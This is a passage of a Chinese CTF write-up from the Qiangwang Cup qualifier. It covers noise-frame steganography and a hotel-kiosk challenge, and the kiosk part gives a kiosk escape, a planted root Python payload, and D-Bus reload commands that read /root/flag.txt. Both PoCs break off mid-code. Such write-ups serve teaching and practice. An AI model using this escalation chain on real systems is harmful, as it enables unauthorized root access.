---
title: 【微信】第十届“强网杯”全国网络安全挑战赛初赛Misc&Crypto WP（三）
source: https://mp.weixin.qq.com/s/cgHv-Q7oTSufiJK9QOxu4w
source_host: mp.weixin.qq.com
clip_date: 2026-11-01T20:10:31+08:00
trace_id: e52c7353-aa30-44f4-aa3a-c00cd139b550
content_hash: d541c9ca4b99f1f7c45e961c203ce488d131cba9a89b51823e9d64c4313c177f
status: synced
tags:
  - 微信
  - CTF
  - 密码学
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: 第十届强网杯初赛12道Misc/Crypto题解：核心考点为时间相关性隐写、kiosk逃逸D-Bus提权、日期种子随机数还原、流量取证还原、白盒世界模型对抗及Coppersmith与格攻击。
ai_summary_style: key-points
images_status:
  total: 1
  succeeded: 1
  failed_urls: []
notion_page_id: 40b75244-d011-8132-ad13-c6c2654bbfef
ioc:
  cves: []
  cwes: []
  hashes:
    - "0110011001101100011000010110011101111011"
    - 02136a685ccd425e537aa0735795019f
    - 03243ad1d8942819f4beaa67c188a578
    - 2091d0d2ed0d5f0288d02c0f29b5e5c7
    - 2a00784e206d2ff25600bbdcab1d879229c9c81d911646f6fbc86cc678b14b2b
    - 3268100616af6522bb081f48d0acf626
    - 387f520883f218a707f3a963fc9aa014
    - 5c2aabdc937513bde1ba502f14cc51b6
    - 5dec31e12a4d02f09d82e254cd752f5ba64bb254472e1111234af2c0e8441419
    - 6d3416fb746f85cad8020e41571f8b7b
    - 8a803e935e33df360a9e1e1976d567c5
    - a8dd12dec43e9f9c36aac8f952cae6cd
    - ce1f5a34c7370f7f20038d9683f1d9b3bdc6dfc51e7db1b5f8798565dac27334
    - cf8303ef7e9fc6f51baf27b6e2c8763bd199a0a24c5294bcdaca3ddef6e47864
    - d7d68e7ed46b6f1082ceaa797b7493e4cad96e00bc45a264bc8cf8a80960b48d
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> 第十届强网杯初赛12道Misc/Crypto题解：核心考点为时间相关性隐写、kiosk逃逸D-Bus提权、日期种子随机数还原、流量取证还原、白盒世界模型对抗及Coppersmith与格攻击。
> 
> - **比赛概况：** 初赛共41题（Misc/Crypto各6、Reverse 3、PWN 17、Web 9），问卷调查895队解出最多，crp-11741无人解出，文章合并给出两方向完整解法。
> 
> - **隐写与取证：** "宇宙微波背景辐射"把文字按时间稳定性编码——背景噪声相邻帧同值概率约0.5、笔画像素接近1，需对199次帧间比较做伯努利统计加高斯平滑才显影，数据分散于隐藏视频轨、tar附件、字幕hex与主视频尾段六处；"谍影重重7"用浏览器密钥解TLS还原VNC画面，经莫尔斯码与换位数字键盘口令逐层解开Restic仓库和AES加密SQLite库。
> 
> - **逃逸提权：** 0perator题借启动脚本漏掉的Super+E快捷键逃出Chromium拿到kiosk shell，再叠加四个缺陷（覆盖目录kiosk可写、python组件验签不绑内容哈希、face.status开关可写、D-Bus重载无鉴权），复用厂商已签名清单装载恶意face.py实现root代码执行。
> 
> - **随机数与AI：** NeuronShuffle的权重由default_rng(20261101)的normal(0,0.6,974)序列生成，打乱置换用相邻日期种子20261102复现48/40/32三个排列；Dreambound利用模型白盒搜索48步动作序列把GRU隐状态推到分布外，单步reward最高564、合计1290通过阈值，暴露奖励模型可被对抗利用。
> 
> - **密码攻击：** crp-12025靠44字节hint给出704位素因子高351位，12维格LLL做Coppersmith恢复因子后直接在q模下解密RSA；zkRSA利用e=2的GQ协议缺陷恢复EC生成器参数、算出16个候选输出猜chal，以com=y^(-c)、res=1伪造证明（单次命中率约1/16）。

**星宇Sec** *2026年11月1日 19:45*

## Misc & Crypto

为深入贯彻习近平总书记关于网络强国的重要思想，特别是习近平总书记关于网络安全工作“四个坚持”的重要指示精神，贯彻落实全国网络安全和信息化工作会议精神，创新网络安全人才培养模式，在中央网信办、河南省人民政府指导下，河南省委网信办、河南省教育厅、郑州市人民政府、信息工程大学、郑州大学联合主办第十届“强网杯”全国网络安全挑战赛，并于今日12:00正式完赛。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/ab58ba4361d6fe27.png)

本次强PWN杯线上初赛共41道题目，其中Misc 6道、Crypto 6道、Reverse 3道、PWN 17道、Web 9道。按比赛解题总榜数据，各题解出队伍数如下：

-   **Misc（6道）**
    

-   宇宙微波背景辐射：801队
    
-   0perator：285队
    
-   NeuronShuffle：630队
    
-   谍影重重7：406队
    
-   Dreambound：429队
    
-   问卷调查：895队（非技术题）
    

-   **Crypto（6道）**
    

-   frozen：874队
    
-   vmshare：899队
    
-   hoRRibleRing：606队
    
-   zkRSA：210队
    
-   crp-12025：272队
    
-   crp-11741：0队
    

-   **Reverse（3道）**
    

-   ELFStudy：1434队
    
-   firmware：438队
    
-   license：473队
    

-   **PWN（17道）**
    

-   babel：414队
    
-   babyark：399队
    
-   babysilent：538队
    
-   babystar：329队
    
-   Babyv8：282队
    
-   bad_puppet：180队
    
-   Blackout：167队
    
-   drywell：215队
    
-   easytl：1059队
    
-   HESEUS：196队
    
-   oldsvr：605队
    
-   ez_qemu：191队
    
-   CanonicoPWN：264队
    
-   hexachord：10队
    
-   What The Fox!：161队
    
-   shadowledger：273队
    
-   Ironclad：60队
    

-   **Web（9道）**
    

-   BlindReview：12队
    
-   cwp：1340队
    
-   ezphp：760队
    
-   ezstar：279队
    
-   ezcms：467队
    
-   Crack a Little Smile：231队
    
-   fault_web_and_fault_hash：133队
    
-   vaultlink：1065队
    
-   vaultlink_revenge：150队
    

## 第十届“强网杯” Misc 与 Crypto 方向题解合集

本文整理本次比赛Misc与Crypto方向的题目，按Misc、Crypto顺序合并。

## Misc1-宇宙微波背景辐射

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | Misc |
| 形态  | 附件题 |
| 附件  | 一个MKV视频（网盘分发，提取码GAME） |
| 目标  | 无（离线附件） |

Flag：flag{S3cr3t_0f_cM6_h1dd3n_1n51d3_5tr34m}

题面提示：老式电视机的雪花噪声中约1%来自宇宙微波背景辐射，“或许这杂乱无章的白噪声中，真的残余了什么秘密”。

### 2\. 题目分析

#### 容器内容

附件是一个MKV容器。用 `ffprobe` 里面装了五样东西：

```
Stream #0:0  Video  (主视频，正常节目画面，结尾约8秒是雪花)
Stream #0:1  Video  (隐藏视频，整段都是雪花，共400帧)
Stream #0:2  Audio
Stream #0:3  Subtitle (SubRip)
Attachment   g2.tar
Attachment   g4.tar
```

MKV的底层是EBML元素树： `Segment` 下并列着 `Tracks` 、 `Attachments` 等节点。每条音视频、字幕轨对应一个 `TrackEntry` ，按类型各自编号，所以字幕显示为 `0:s:0` ；两个tar不在轨道里，而是以 `Attachment` 元素挂在 `Segment` 下，每个元素带 `FileName` 、 `FileMimeType` 、 `FileData` 三个字段，因此 `ffprobe` 只在末尾单列 `Attachment` 行，不占用流编号。这决定了后续两条不同的提取路径：轨道用 `-map` 选，附件只能用 `-dump_attachment` 导。

五类载体实际承载六段文字：隐藏视频轨共400帧，前后各200帧是两段独立文字；主视频只有结尾约8秒（按25 fps约200帧）是雪花；字幕轨200条正文；两个tar各200张图片。音频轨是干扰项，不含信息。

#### 单帧看不见

每段素材的200帧里，文字并不是用固定灰度“画”上去的：笔画内部同样填满噪声，单帧看上去和背景没有区别，对多帧直接求灰度均值也会被噪声淹没。真正的差别在时间维度上——背景噪声每帧重新随机生成，同一像素在相邻两帧取相同值的概率约为0.5；笔画覆盖的像素则逐帧复制同一份噪声，相邻帧同值概率接近1。文字是以“时间稳定性”而不是“亮度”编码的。

于是问题转化为一个逐像素的伯努利检验：对每个坐标统计199次相邻帧比较中“相同”的比例，背景期望0.5，文字区域显著高于0.5。单个像素的估计噪声很大（标准差约0.035），但文字是空间连通的，几百个像素的偏差同向叠加，再做空间平滑就能把信噪比拉起来。最后按六段各自的语义把文字排成一句话，即得flag。

### 3\. 解题过程

#### 拆容器

先用 `ffprobe -show_streams -show_attachments` 核对轨道编号、帧率和附件名，再原样抽取，不需要重新编码：

```
ffmpeg -y -i challenge.mkv -map 0:1 -c copy hidden.mkv
ffmpeg -y -i challenge.mkv -map 0:s:0 hidden.srt
ffmpeg -y -dump_attachment:t "" -i challenge.mkv
```

命令细节：

-   `-map 0:1` 选输入0的第1号流，即隐藏视频轨； `-c copy` 只搬运已编码packet，不重新解码编码，帧数、时间戳、像素值都与原文件一致。若改成重新编码，编码器可能丢帧或补帧，200帧等间隔的前提就被破坏。
    
-   `-map 0:s:0` 按“字幕类型第0条”选取，避免和视频流编号混淆。
    
-   `-dump_attachment:t ""` 中 `t` 限定附件类型，空字符串作为匹配模式表示全部匹配；附件按 `FileName` 落到当前目录，得到 `g2.tar` 、 `g4.tar` 。
    
-   两个tar解开后分别是编号零填充的BMP/PNG序列（如 `000.bmp` 到 `199.bmp` ），按文件名排序即时间顺序。BMP与PNG都是无损格式，不会像JPEG那样在帧间引入压缩抖动，这一点对“相邻帧是否相同”的统计很关键。
    

#### 六段数据的来源

| 拼接顺序 | 数据来源 | 图片数量 | 恢复出的文字 |
| --- | --- | --- | --- |
| 1   | 隐藏视频轨前半段（帧0–199） | 200 | `f1ag{S` |
| 2   | 附件 `g2.tar` | 200 | `3cr3t_` |
| 3   | 隐藏视频轨后半段（帧200–399） | 200 | `0f_cM6_` |
| 4   | 附件 `g4.tar` | 200 | `h1dd3n_` |
| 5   | 字幕中的十六进制PNG | 200 | `1n51d3_` |
| 6   | 主视频结尾约8秒雪花 | 约200 | `5tr34m}` |

取帧时有三点必须卡死：

-   **隐藏轨前后分段**： `hidden.mkv` 共400帧，用 `cv2.VideoCapture` 顺序读到内存后按\[0:<端口>\]、\[200:<端口>\]切开。OpenCV按显示顺序解码，B帧已被重排，所以数组下标相邻就等于时间相邻。若把400帧一起统计， `f1ag{S` 与 `0f_cM6_` 会叠加成重影。
    
-   **字幕正文还原PNG**：SRT以空行分块，每块第一行是序号、第二行是时间轴、其余是正文。正文是一条被换行拆开的十六进制串，去掉非 `[0-9a-f]` 字符后应满足长度为偶数且以 `89504e47` 开头， `bytes.fromhex()` 后再 `cv2.imdecode` 即得一张单帧PNG；200条正好200帧。时间轴不参与计算，块的出现顺序就是帧序。
    
-   **主视频尾段定位**：读容器fps与总帧数， `start = total - round(fps * 8)` ，用 `CAP_PROP_POS_FRAMES` 跳转后连续读到结尾，取最后200帧。25 fps时8秒正好200帧；帧率不同则按同一公式自适应。
    

#### 用时间相关性把文字积出来

第一步是二值化而不是直接比较灰度：BMP/PNG解码后的像素受调色板和细微抖动影响，两个稳定像素的灰度值也未必逐位相等，直接比较“相等”几乎恒为假。用阈值125把每帧压成0/1位图后，“相同”才有意义——笔画像素的位在多帧间保持不变，噪声像素的位则近似等概率翻转。阈值取125是因为雪花灰度近似铺满0–255，该值落在笔画与背景直方图的谷底附近；过低会把背景划入笔画，过高会削掉笔画边缘，实际可在100–150之间扫一遍确认稳定。

```
score[y,x] = (1/(N-1)) * Σ_t [ B_t[y,x] == B_{t-1}[y,x] ]
```

实现时先令 `prev = frames[0] > 125` ，从第1帧循环到第199帧，每轮 `score += (cur == prev)` 再更新 `prev` ，共199次比较，最后除以199。 `score` 用 `float64` 累加，避免uint8在199次加法中溢出。

统计性质决定了后处理的必要性：零假设下每次比较是p=0.5的伯努利试验，199次的均值标准差为 `0.5/sqrt(199) ≈ 0.035` ，文字区若p≈0.55，单像素只有约1.4σ，肉眼仍是一片灰。帧数增加到200以上只能按 `1/sqrt(N)` 降低噪声，边际收益有限，所以必须借助空间信息：

1.  **高斯平滑**： `cv2.GaussianBlur(score, (0,0), 2)` ，ksize传 `(0,0)` 时由sigma自动推出约9×9的核。等效平均几十个像素后，噪声标准差降到千分之几，0.05的偏移就变成十几个σ，文字轮廓浮现；半径不能大，否则相邻笔画糊在一起。
    
2.  **对比度拉伸**： `np.clip((smooth - 0.49) * 2200, 0, 255)` 。以0.49为基线略低于0.5，保证背景被压到接近0而不误伤偏暗的笔画；增益2200把0.01的差异放大成22个灰阶，0.55处约为132，黑白分明。
    
3.  **先截断后转uint8**： `np.clip` 必须在 `astype(np.uint8)` 之前。负值直接转uint8会回绕成255，背景整片变白，文字反而被淹没。
    

#### 帧顺序重排与flag拼接

六张恢复图按数据在容器里的存放位置编号为part0–part5，但存放顺序不是语义顺序。按3.2表重排为 `[0, 1, 4, 3, 2, 5]` ，即隐藏轨前半、 `g2` 、字幕、 `g4` 、隐藏轨后半、主视频尾段：

```
f1ag{S | 3cr3t_ | 0f_cM6_ | h1dd3n_ | 1n51d3_ | 5tr34m}
```

判断顺序的依据是语义： `S3cr3t_0f_cM6` 是“CMB的秘密”， `h1dd3n_1n51d3` 是“藏在里面”， `5tr34m` 是“stream”，只有这个排列能读通。按存放顺序直接拼会得到跨段的乱码，而 `np.hstack` 只做像素拼接、不校验语义，错序只能靠人眼读图发现，所以六张恢复图要分别落盘、逐张核对。横向拼接前按最小高度裁齐各图，才能对齐基线。画面首段写作 `f1ag{` ，用数字1冒充字母l，提交时只替换第一处前缀为 `flag{` ，其余字符（包括 `cM6` 的大小写、下划线和结尾花括号）保持原样，最终flag为：

```
flag{...}
```

### 4\. PoC

```python
"""从MKV还原六段文字并拼出flag。
用法: 运行上文PoC代码 challenge.mkv
输出: recovered/part0..part5.png, recovered/recovered_parts.png, recovered/flag.txt
"""
import re
import subprocess
import sys
import tarfile
from pathlib import Path

import cv2
import numpy as np

SRC = Path(sys.argv[1]).resolve()
ROOT = SRC.parent
WORK = ROOT / "analysis"
OUT = ROOT / "recovered"
WORK.mkdir(exist_ok=True)
OUT.mkdir(exist_ok=True)

THRESH = 125          # 二值化阈值
SIGMA = 2.0           # 高斯平滑半径
BASE = 0.49           # 相关性基线
GAIN = 2200.0         # 对比度拉伸系数
COUNT = 200           # 每段帧数

def run(cmd, cwd=None):
    subprocess.run(cmd, check=True, cwd=cwd)

## ---------- 1. 拆轨与拆附件 ----------
run(["ffmpeg", "-y", "-i", str(SRC), "-map", "0:1", "-c", "copy",
     str(WORK / "hidden.mkv")])
run(["ffmpeg", "-y", "-i", str(SRC), "-map", "0:s:0", str(WORK / "hidden.srt")])
run(["ffmpeg", "-y", "-dump_attachment:t", "", "-i", str(SRC)], cwd=WORK)

for name in ("g2.tar", "g4.tar"):
    with tarfile.open(WORK / name) as tf:
        tf.extractall(WORK / name.split(".")[0])

## ---------- 2. 取帧 ----------
def read_video(path, start=0, count=COUNT):
    cap = cv2.VideoCapture(str(path))
    frames, idx = [], 0
    while len(frames) < count:
        ok, frame = cap.read()
```

* * *

## Misc2-0perator

### 1\. 题目信息

| 项目  | 内容  |
| --- | --- |
| 分类  | Misc |
| 形态  | 容器题（VNC远程桌面） |
| 附件  | 无   |
| 目标  | 读取/root/flag.txt |

Flag：flag{动态容器已脱敏}

题面：酒店的大堂自助入住机疑似存在漏洞，需要展开调查。

### 2\. 题目分析

#### 目标形态

用 `nc` 连上题目入口，得到的是VNC服务的握手（ `RFB 003.008` ），不是普通交互程序。VNC桌面是一台Chromium kiosk自助入住机：

-   应用标题： `Qiangwang Cup Hotel — SELF CHECK-IN · POWERED BY OPERATOR`
    
-   设备编号： `KIOSK-07`
    
-   会话：Xvfb:<端口>+ `x11vnc` （root运行）+xfwm4/xfsettingsd（XFCE）
    
-   后端：Flask（<靶机地址>，kiosk用户）+root设备管理器（D-Bus）
    

#### 攻击链总览

```
屏幕二维码泄漏TOTP密钥
        │
        ▼
kiosk逃逸：Super+E → Thunar → Open Terminal Here → shell(kiosk)
        │
        ▼
设备管理器组件覆盖机制被滥用
  ① /var/lib/0perator/components/user  kiosk可写
  ② python组件验签include_sha256=False（签名不绑内容）
  ③ /run/0perator/face.status  kiosk可写 → 置disabled
  ④ D-Bus ReloadComponents允许kiosk调用
        │
        ▼
root设备管理器加载我方face.py → root执行 → 复制/root/flag.txt
```

入住机业务流（ `/totp` → `/checkin` → `/face/start` ）并不是入口：样例环境没有摄像头，人脸核验必然失败。真正可利用的是“桌面逃逸+组件覆盖”这条链。

#### 三个安全域

机器把顾客界面与特权逻辑拆成三层：

| 安全域 | 进程  | 身份  | 暴露面 |
| --- | --- | --- | --- |
| 业务  | `app.py` | kiosk | 仅<靶机地址> |
| 展示  | Xvfb/x11vnc/xfwm4 | 服务root，会话kiosk | 5900，口令认证 |
| 设备  | `manager.py` | root | 系统总线 `org.operator.DeviceManager` |

设计假设是：顾客只碰得到浏览器，kiosk即使被拿下也只是普通用户，D-Bus调用方可信。裂缝在于桌面会话本身就以kiosk身份可交互，而覆盖目录与降级开关都落在kiosk可写处。链能走通不是某行代码写错，是三个假设同时失效。

#### 加载契约

管理器的职责是“把组件装进自己的进程”，分三段：发现（厂商目录与覆盖目录按 `id` 归并，覆盖优先）、验签（用 `component-signing.pub` 校验清单 `signature` ）、装载（ `python` 走 `importlib` 导入 `entry` 并回调 `on_load` ， `native` 走动态库）。危险在二、三段接缝：验签查的是清单，装载读的是 `entry` 指名的另一个文件，签名对象与执行对象分离后，签名退化成“目录准入标签”。叠加可写覆盖目录、可写降级开关、无鉴权重载，契约被按“写入→使能→触发→root装载”逐一击穿。

### 3\. 解题过程

#### 二维码泄漏的动态令牌密钥

首屏是「手机动态码验证」，屏幕上直接画着一个绑定二维码。对VNC画面截图后交给OpenCV的 `QRCodeDetector` 解码，得到：

```
otpauth://totp/0perator:KIOSK-07?secret=ULPYXTUIZVJZQRJVWGM2MISRTLZGJTEF&issuer=0perator
```

漏洞在于：TOTP密钥 `ULPYXTUIZVJZQRJVWGM2MISRTLZGJTEF` 直接印在自助机屏幕上（issuer用数字0冒充字母O），任何人扫码即可无限生成6位动态码，“手机绑定+动态口令”形同虚设。

为什么密钥泄漏就等于失守：TOTP是对称的，服务端与令牌端持有同一secret，各算 `HMAC-SHA1(secret, floor(now/30))` 再动态截断取6位；secret本身即凭证，所谓“手机”只是它的存放处，把绑定二维码长期画在公共屏幕上等于公开第二因素（issuer用数字0只是品牌混淆）。 `pattern` 是浏览器端格式拦截，服务端只做数值比对，绕过无收益；之后靠cookie里的会话标记串联，业务流可脚本驱动。

拿到密钥后按标准TOTP（HMAC-SHA1、30秒步长、6位、Base32解码）在本地生成动态码，提交到 `POST /totp` （前端 `pattern="[0-9]{6,7}"` 只是格式校验）。会话用cookie `session=eyJ0b3RwX29r…` 维持。业务流后续字段：

| 步骤  | 请求  | 字段  |
| --- | --- | --- |
| 动态码 | `POST /totp` | `code` |
| 入住人信息 | `POST /checkin` | `full_name`<br><br>/ `id_number` / `phone` / `note` |
| 人脸核验 | `POST /face/start` | `viewport` |

`/face/start` 恒返回“未识别到人脸→摄像头未能完成人脸核验”，房间永远停在「待分配」，所以继续走业务流程没有意义，转向桌面逃逸。

#### kiosk逃逸

启动脚本 `/opt/0perator/scripts/start-kiosk.sh` 把少数XFCE全局快捷键改成了 `true` 来“中和”它们：

```javascript
xfconf-query -c xfce4-keyboard-shortcuts -p "/commands/custom/<Primary><Alt>t"  -s "true"
xfconf-query -c xfce4-keyboard-shortcuts -p "/commands/custom/<Alt>F2"          -s "true"
xfconf-query -c xfce4-keyboard-shortcuts -p "/commands/custom/<Primary><Alt>Delete" -s "true"
xfconf-query -c xfce4-keyboard-shortcuts -p "/commands/custom/<Super>"          -s "true"
```

`<Super>e` （Thunar）不在中和列表里。于是：

```
Super+E  →  弹出Thunar文件管理器（当前用户kiosk，可浏览整个根文件系统）
右键 → Open Terminal Here  →  xfce4-terminal：kiosk@engine-1
```

这一步拿到的是kiosk用户的完整shell，后续所有利用都在这个shell里完成。

因果上：浏览器层确实被封死（地址栏、 `Ctrl+Shift+I` 、右键菜单、 `F11` ），但键盘事件的消费方不止浏览器。xfwm4在更外层分发全局快捷键， `<Super>e` 直接由它绑定到 `thunar` ，浏览器收不到这个按键，改页面JS也堵不住。启动脚本是黑名单式中和（ `<Primary><Alt>t` 、 `<Alt>F2` 、 `<Primary><Alt>Delete` 、 `<Super>` ），漏项即漏洞。而Thunar的价值是“在当前目录开终端”，把图形界面一步变成kiosk shell——此后写文件、发D-Bus消息都只能靠它，所以这一步是枢纽而非便利。

#### 环境测绘

进程与监听情况：

```swift
pid  1  root   /bin/bash /opt/0perator/scripts/entrypoint.sh --stage2
pid 21  root   /usr/bin/python3 /opt/0perator/device_manager/manager.py     ← 设备管理器
pid 24  root   nginx: master process nginx -g daemon off;
pid 29  www-data nginx: worker process
pid 27  kiosk  /opt/venv/bin/python /opt/0perator/app/app.py                ← 入住机后端
pid 495 root   Xvfb :<端口> -screen 0 1280x800x24
pid 641 root   x11vnc -display :<端口> -forever -shared -noclipboard -noremote -rfbauth /etc/x11vnc.pass -rfbport 5900
```

监听：<靶机地址>（Flask）、<靶机地址>（nginx静态站， `/opt/0perator/support/html` + `/downloads/` ）、<靶机地址>（x11vnc）。

注意目录名是数字零开头的 `/opt/0perator` ，不是字母o的 `/opt/operator` 。

80端口的「GUEST SUPPORT / FACE-0x07」页面提供现场诊断包 `/downloads/0perator-diag.zip` ：

```
0perator-diag.zip
  ├─ device-manager.log   管理器初始组件状态
  ├─ components.json      组件清单
  ├─ field-service.md     现场服务指南
  └─ system-info.txt      hostname/kernel/python/user_override_dir
```

`field-service.md` 把设计缺陷写得明明白白：

```swift
- Vendor components: `/usr/share/0perator/components`
- Field overrides:  `/var/lib/0perator/components/user`
Field overrides take precedence when the matching vendor component is degraded.
The `user` directory is writable by the kiosk service account so on-site staff
can drop a replacement component without reinstalling the terminal.
```

`components.json` 给出两个组件： `face-recognition` （3.2.1，type `python` ）与 `printer-driver` （1.4.0，type `native` ）。 `device-manager.log` 暴露了 `user_override_dir` 与 `face_disabled` 两个状态字段。

诊断包把该看的东西直接交到手上： `components.json` 说明组件有两种 `type` ，决定后面挑哪个下手； `device-manager.log` 的 `user_override_dir` 与 `face_disabled` 提前暴露覆盖路径与健康判定； `system-info.txt` 确认该目录归属kiosk。 `field-service.md` 则说明两条需求——覆盖目录须kiosk可写、覆盖只在厂商件降级时生效。需求合理，实现却把“可写”与“生效条件”一起交给了低权限侧，这就是分支能被翻转的根源。

#### 提权原理

设备管理器 `/opt/0perator/device_manager/manager.py` 的常量：

```toml
BUS_NAME    = "org.operator.DeviceManager"
OBJECT_PATH = "/org/operator/DeviceManager"
IFACE       = "org.operator.DeviceManager1"
VENDOR_DIR  = os.environ.get("COMPONENT_VENDOR_DIR", "/usr/share/0perator/components")
USER_DIR    = os.environ.get("COMPONENT_USER_DIR", "/var/lib/0perator/components/user")
PUBKEY      = os.environ.get("COMPONENT_PUBKEY",   "/etc/0perator/component-signing.pub")
FACE_STATUS = os.environ.get("FACE_STATUS_PATH",   "/run/0perator/face.status")
## component installation is not exposed over D-Bus,
## but field overrides are read from a kiosk-writable directory.
```

对外只暴露三个无参方法： `GetStatus` 、 `ListComponents` 、 `ReloadComponents` 。

组件加载逻辑在 `component_loader.py` ：

```python
def _face_disabled(self) -> bool:
    try:
        return self.face_status_path.read_text(encoding="utf-8").strip() == "disabled"
    except OSError:
        returnFalse

for component_id, (directory, manifest) in vendor.items():
    if component_id in user:
        override_dir, override_manifest = user[component_id]
        if component_id == "face-recognition"andnot self._face_disabled():
            # Field override is only activated for a failed face component.
            self.log.info("face override present but face component is healthy; using vendor component")
            self._load_component(directory, manifest, source="vendor")
        else:
            self._load_component(override_dir, override_manifest, source="user-override")
```

验签分两种：

```python
## python组件：importlib加载entry，仅校验清单签名，不绑内容哈希
if not verify_manifest(manifest, self.public_key, include_sha256=False):
    self.failures[component_id] = "signature"
## native组件：额外用清单里的sha256钉住.so
if not verify_manifest(manifest, self.public_key, include_sha256=True):
    self.failures[component_id] = "signature"
```

四个缺陷叠起来就是一条root代码执行链：

1.  `/var/lib/0perator/components/user` 权限为 `drwxr-xr-x kiosk kiosk` ，kiosk可写；
    
2.  python组件 `include_sha256=False` ，签名只覆盖清单字段、不覆盖 `entry` 文件内容，可以复用厂商已签名清单、只替换 `face.py` ；
    
3.  降级开关 `/run/0perator/face.status` 位于kiosk可写的 `/run` 下，写入 `disabled` 就能让管理器走 `user-override` 分支；
    
4.  D-Bus策略允许 `user="kiosk"` 调用 `ReloadComponents` ，无鉴权。
    

按因果顺序把这四点摊开：

-   **可写目录决定“能放东西”**：装载读的是文件系统而非数据库，能在覆盖目录造出同 `id` 的子目录，管理器就会把它列为候选。
    
-   **验签范围决定“能否过检”**： `include_sha256=False` 对python组件只比对清单字段与签名是否匹配公钥，不看 `entry` 文件哈希； `native` 组件用 `include_sha256=True` 把`.so` 钉住，所以同一手法对 `printer-driver` 无效——这是必须选 `face-recognition` 的直接原因。
    
-   **使能条件决定“候选会被选中”**：只有 `not self._face_disabled()` 成立时才退回厂商件，而该判断只读 `/run/0perator/face.status` 是否为 `disabled` ， `/run` 可写，健康判定因此被低权限侧篡改。
    
-   **调用权限决定“谁能触发”**： `ReloadComponents` 无入参、无鉴权，策略放行 `user="kiosk"` ，一条 `dbus-send` 就能让root进程重走装载。
    

四者缺一不可：没有可写目录只能看不能改；签名绑内容则替换 `face.py` 必然失败；改不了状态则覆盖件被健康判定挡回；调不动重载只能等重启。凑齐后，攻击者做的是“借厂商的合法签名，装载自己的代码”。

#### 利用

**(1)复制厂商已签名清单**

在kiosk可写目录下建一个与厂商同名的 `face-recognition` 目录，把厂商 `manifest.json` 原样复制过去。清单里只有这些字段被签名：

```json
{
  "id": "face-recognition",
  "version": "3.2.1",
  "vendor": "0perator",
  "type": "python",
  "entry": "face.py",
  "signature": "i5V8oH0ASlvImhI/n4zlGmDkL0mablr39hPFu5DNxtOWIJzTQH…"
}
```

为什么复制而不是自己写一份：私钥不在容器里，签名无法伪造，清单任何一个被签字段改动都会验签失败。而复用原件时，签名不覆盖 `entry` 内容这一点使清单一个字节都不必改—— `entry` 仍然写着 `face.py` ，我方只要在同一目录放一个同名文件，验签通过、装载路径也指向它。这是整条链里最省的一步，也是缺陷②的直接兑现。

**(2)放载荷 `face.py`**

同名替换 `entry` 指向的 `face.py` 。管理器用 `importlib` 加载entry后调用 `on_load(ctx)` ，模块级代码在导入时即以root执行，所以载荷写在模块顶层也能生效：

```python
import os
os.system("cp /root/flag.txt /home/kiosk/flag.txt; chmod 644 /home/kiosk/flag.txt; id > /home/kiosk/pwn.txt")
def on_load(ctx):
    return None
```

执行时机值得说清：装载发生在管理器自己的进程里， `importlib` 导入 `entry` 时就会执行模块顶层语句， `on_load(ctx)` 只是装载后的回调，所以载荷不实现 `on_load` 也会在那个时刻以root跑完；写空实现只是让契约正常、避免回调报错干扰返回值判断。身份来自管理器进程的uid而非文件属主，kiosk写的文件被执行时仍是root权限。root没有capability也不妨碍读 `/root` ，因为读自己的目录靠属主位；先复制到 `/home/kiosk` 再 `chmod 644` 是为了让kiosk shell直接 `cat` 。

**(3)翻转降级开关并触发重载**

```bash
mkdir -p /run/0perator
printf 'disabled' > /run/0perator/face.status
dbus-send --system --print-reply --dest=org.operator.DeviceManager \
  /org/operator/DeviceManager org.operator.DeviceManager1.ReloadComponents
```

`field-service.md` 写的总线名是 `org.0perator.DeviceManager` ，其中 `0perator` 以数字开头是非法D-Bus名（会报 `is not a valid bus name` ），真实名称是 `org.operator.DeviceManager` ，对象路径 `/org/operator/DeviceManager` ，接口 `org.operator.DeviceManager1` 。可以用 `dbus-send --system --print-reply --dest=org.freedesktop.DBus /org/freedesktop/DBus org.freedesktop.DBus.ListNames` 核对。

这三步的顺序不能调换：先建目录与清单（素材就位），再写 `face.py` （载荷就位），再置 `disabled` （分支使能），最后发重载（动作触发）。若先重载后置状态，管理器读到的仍是“人脸健康”，只会打印“override present but face component is healthy”并装载厂商件，返回里 `source` 依旧是 `vendor` 。若只置状态不发重载，则要等到下一次自然重载才生效——重载是唯一让root进程重新执行装载逻辑的入口，这正好是缺陷④的用处。

**(4)结果**

重载返回：

```json
{"loaded": {"face-recognition": {"source": "user-override", "type": "python",
            "entry": "face.py", "version": "3.2.1"},
            "printer-driver": {"source": "vendor", "type": "native", "entry": "printer.so",
            "version": "1.4.0", "sha256": "2a00784e206d2ff25600bbdcab1d879229c9c81d911646f6fbc86cc678b14b2b"}},
 "failures": {}, "face_disabled": true,
 "user_override_dir": "/var/lib/0perator/components/user"}
```

`source` 为 `user-override` 说明我方组件被加载并执行了。

同时注意 `printer-driver` 仍是 `vendor` 且带 `sha256` ：原生组件按内容哈希钉住，未被波及； `failures` 为空表示清单验签通过，两项合起来正好对应“签名合法但内容被换”这一利用条件。 `face_disabled: true` 确认降级开关已被写入。随后：

```bash
$ cat /home/kiosk/pwn.txt
uid=0(root) gid=0(root) groups=0(root)

$ cat /home/kiosk/flag.txt
flag{动态容器已脱敏}
```

### 4\. PoC

```python
import base64
import hashlib
import hmac
import struct
import time

SECRET = "ULPYXTUIZVJZQRJVWGM2MISRTLZGJTEF"

def totp(secret: str, digits: int = 6, period: int = 30) -> str:
    key = base64.b32decode(secret, casefold=True)
    counter = struct.pack(">Q", int(time.time()) // period)
    digest = hmac.new(key, counter, hashlib.sha1).digest()
    offset = digest[-1] & 0x0F
    value = struct.unpack(">I", digest[offset:offset + 4])[0] & 0x7FFFFFFF
    return str(value % 10 ** digits).zfill(digits)

print(totp(SECRET))

```

```
import cv2

img = cv2.imread("screen.png")
text, _, _ = cv2.QRCodeDetector().detectAndDecode(img)
print(text)
## otpauth://totp/0perator:KIOSK-07?secret=ULPYXTUIZVJZQRJVWGM2MISRTLZGJTEF&issuer=0perator

```

```bash
cd /var/lib/0perator/components/user
mkdir -p face-recognition
cp /usr/share/0perator/components/face/manifest.json face-recognition/manifest.json

cd /var/lib/0perator/components/user/face-recognition
cat > face.py <<'PY'
import os
os.system("cp /root/flag.txt /home/kiosk/flag.txt; chmod 644 /home/kiosk/flag.txt; id > /home/kiosk/pwn.txt")

def on_load(ctx):
    return None
